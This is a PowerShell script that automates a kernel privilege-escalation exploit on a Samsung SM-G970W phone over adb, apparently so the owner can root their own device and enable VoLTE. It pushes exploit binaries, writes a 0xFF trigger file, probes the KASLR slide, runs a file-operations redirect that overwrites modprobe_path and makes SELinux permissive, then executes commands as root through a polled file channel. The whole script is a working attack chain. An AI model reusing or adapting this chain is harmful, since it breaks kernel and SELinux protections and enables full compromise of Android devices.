# enable_vn.ps1 - re-root the Samsung SM-G970W (ghostlock `glA21` driver) and run the
# Vietnam VoLTE override script through the resulting root channel.
#
# This is the "when you come back with the SIM inserted, run this" script. It is
# self-contained: it re-pushes the on-device tooling from this repo if missing,
# regenerates the trigger file, re-probes the KASLR slide for the current boot,
# re-applies the modprobe_path root, triggers it, then runs scripts/vn_volte.sh.
#
# IMPORTANT (verified on device):
#   * The trigger file MUST hold a NON-PRINTABLE magic (4 x 0xFF). With printable
#     bytes ("????") the kernel's search_binary_handler() skips request_module()
#     entirely and no helper is spawned.
#   * Arm /data/local/tmp/rcmd BEFORE triggering: the helper daemon polls rcmd.
#   * The root is uid 0 with SELinux context u:r:kernel:s0. The exploit now also
#     marks the kernel domain permissive in the loaded policy and the helper
#     (mpnl) syncs user-space SELinux to permissive, so `setprop` DOES work from
#     this domain. `settings` remains blocked by DEFEX. See
#     docs/SELINUX_USERSYNC.md.
#
# Usage:  powershell -ExecutionPolicy Bypass -File scripts\enable_vn.ps1
param(
  [string]$Adb  = "E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe",
  [string]$Repo = (Split-Path -Parent $PSScriptRoot)
)

$ErrorActionPreference = "Stop"
function Die($m) { Write-Host "ERROR: $m" -ForegroundColor Red; exit 1 }
function Info($m){ Write-Host $m }
function Sh($c){ & $Adb shell $c 2>&1 }

if (-not (Test-Path $Adb)) { Die "adb not found: $Adb" }
$Repo = (Resolve-Path $Repo).Path
Info "repo  = $Repo"

& $Adb wait-for-device
$boot = (Sh "cat /proc/sys/kernel/random/boot_id").Trim()
Info "boot  = $boot"

# --- 1/6 ensure the on-device tooling exists (push from the repo if missing) ---
Info "[1/6] checking on-device tooling..."
$have = (Sh "ls /data/local/tmp 2>/dev/null") -join "`n"
function Ensure($dev, $src) {
  $base = ($dev -split '/')[-1]
  if ($have -match [regex]::Escape($base)) { return }
  $local = Join-Path $Repo $src
  if (-not (Test-Path $local)) { Write-Host "  (warn) $dev missing and no local $src" -ForegroundColor Yellow; return }
  Info "  pushing $src -> $dev"
  & $Adb push $local $dev | Out-Null
}
Ensure "/data/local/tmp/glA21"       "glA21_a64"
Ensure "/data/local/tmp/dnroot"      "glA21_dnroot_a64"
Ensure "/data/local/tmp/mpnl"        "glA21_mpnl_a64"
Ensure "/data/local/tmp/vn_volte.sh" "scripts/vn_volte.sh"
Sh "chmod 755 /data/local/tmp/glA21 /data/local/tmp/dnroot /data/local/tmp/mpnl /data/local/tmp/vn_volte.sh 2>/dev/null" | Out-Null

# trigger file: 4 x 0xFF (non-printable magic -> request_module("binfmt-ffff"))
$pwn = Join-Path $env:TEMP "ghostlock_pwn2"
[IO.File]::WriteAllBytes($pwn, [byte[]](0xFF,0xFF,0xFF,0xFF))
& $Adb push $pwn /data/local/tmp/pwn2 | Out-Null
Sh "chmod 755 /data/local/tmp/pwn2" | Out-Null

# --- 2/6 warm the payload + channel files (cache fscrypt i_crypt_info) ---
# NB: do NOT exec mphelper here: it daemonizes (fork+setsid) and, if started from
# the shell, leaves a lingering shell-domain daemon that hijacks rcmd.
Info "[2/6] warming payloads (fscrypt)..."
Sh "rm -f /data/local/tmp/rout /data/local/tmp/mp_ran; : > /data/local/tmp/rout; : > /data/local/tmp/mp_ran; cat /data/local/tmp/dnroot /data/local/tmp/mphelper /data/local/tmp/rout /data/local/tmp/vn_volte.sh >/dev/null 2>&1; echo warm" | Out-Null

# --- 3/6 probe the runtime KASLR slide for THIS boot ---
Info "[3/6] slideprobe (this boot)..."
$sp = (Sh "timeout 70 /data/local/tmp/slideprobe") -join "`n"
$ms = [regex]::Matches($sp, 'IP\s+([0-9a-fA-F]{8,16})')
if ($ms.Count -eq 0) { Die "slideprobe produced no IPs (device wedged? reboot and retry)" }
$sel = $null
foreach ($x in $ms) { if ($x.Groups[1].Value.ToLower().EndsWith("bd4")) { $sel = $x.Groups[1].Value; break } }
if (-not $sel) { $sel = $ms[0].Groups[1].Value }
$lowHex = $sel.Substring($sel.Length - 8)
$low    = [Convert]::ToUInt32($lowHex, 16)
$slide  = [int64]$low - [int64]0x08000000 - [int64]0x3bd4
$slideHex = "0x{0:x}" -f $slide
Info "      dominant IP = $sel  ->  SLIDE = $slideHex"

# --- 4/6 fops redirect + write modprobe_path + SELinux off ---
Info "[4/6] exploit (fops redirect -> modprobe_path + selinux off)..."
$run = (Sh "env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 SLIDE=$slideHex MP_PATH=/data/local/tmp/mpnl timeout 150 /data/local/tmp/glA21 --stop-after=verify --log=info") -join "`n"
($run -split "`n") | Where-Object { $_ -match 'modprobe_path|permissive_map|STOP_VERIFY|ONLY_FOPS|pselect route done|FAIL' } | ForEach-Object { Info "      $_" }
if ($run -notmatch 'selinux_off=1') {
  Write-Host "      (warn) selinux_off=1 not seen -> walk failed this attempt; re-run (slide varies per boot)." -ForegroundColor Yellow
  exit 2
}

# --- 5/6 arm the command channel FIRST, then trigger ---
# NB: do NOT delete rout. The kernel-domain helper cannot *create* a new file in
# /data/local/tmp (fscrypt ENOKEY: "Required key not available"); it can only
# truncate/rewrite an existing, warmed file. Step 2 already created + warmed rout.
Info "[5/6] arming the command channel + triggering the root helper..."
Sh "echo 'id; sh /data/local/tmp/vn_volte.sh; echo ---; getprop persist.dbg.volte_avail_ovr' > /data/local/tmp/rcmd; cat /data/local/tmp/rcmd /data/local/tmp/rout >/dev/null 2>&1; /data/local/tmp/pwn2 >/dev/null 2>&1; echo triggered" | Out-Null

# --- 6/6 read the root channel output (retry; the daemon polls every 300 ms) ---
Info "[6/6] reading the root channel output..."
$out = ""
for ($i = 0; $i -lt 6; $i++) {
  Start-Sleep -Seconds 2
  $out = (Sh "cat /data/local/tmp/rout 2>/dev/null") -join "`n"
  if ($out -match "uid=0\(root\)") { break }
}
Info "----- root channel output -----"
Info $out
Info "-------------------------------"
if ($out -match "uid=0\(root\)") {
  Write-Host "SUCCESS: root channel is alive (uid 0, context u:r:kernel:s0)." -ForegroundColor Green
  if ($out -match "Failed to set property") {
    Write-Host "NOTE: setprop was DENIED by SELinux (kernel-domain root). See docs/KSU_ROOT_FINDINGS.md" -ForegroundColor Yellow
  }
} else {
  Write-Host "Root channel gave no output. Re-run steps 3-6 (slide varies per boot)." -ForegroundColor Yellow
  exit 3
}
